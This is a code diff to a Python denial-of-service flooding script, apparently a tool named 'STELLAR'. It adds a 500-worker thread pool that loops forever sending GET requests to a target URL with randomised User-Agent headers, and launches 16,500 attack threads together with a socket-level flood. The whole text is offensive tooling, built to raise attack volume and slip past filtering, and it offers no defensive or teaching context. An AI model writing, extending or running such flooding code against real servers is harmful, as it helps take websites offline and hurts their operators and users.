@@ -6,6 +6,7 @@ import time
 import socket
 import ssl
 from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor
 
 os.system('clear')
 print("POST Method is currently being fixed and it is error right now, please use GET instead.")
@@ -130,12 +131,19 @@ def LaunchSTELLAR(url, timer):
         except:
             s.close()
 
-# Mulai ( start flooding )
+def concurrent_flood_url():
+    with ThreadPoolExecutor(max_workers=500) as executor:
+        while True:
+            user_agent = ' '.join([random.choice(USER_AGENT_PARTS['platform'][k]) for k in USER_AGENT_PARTS['platform']])
+            user_agent += ' (' + random.choice(USER_AGENT_PARTS['platform']['webkit']['name']) + ')'
+            headers['User-Agent'] = user_agent
+            executor.submit(requests.get, url, headers=headers)
 
+# MULAI MANGG
 default_threads = 16500
 for i in range(default_threads):
     threading.Thread(target=attack, args=(i,)).start()
-threading.Thread(target=flood_url).start()
+threading.Thread(target=concurrent_flood_url).start()
 
 attackSTELLAR(url_stellar, timer_stellar, threads_stellar)
 
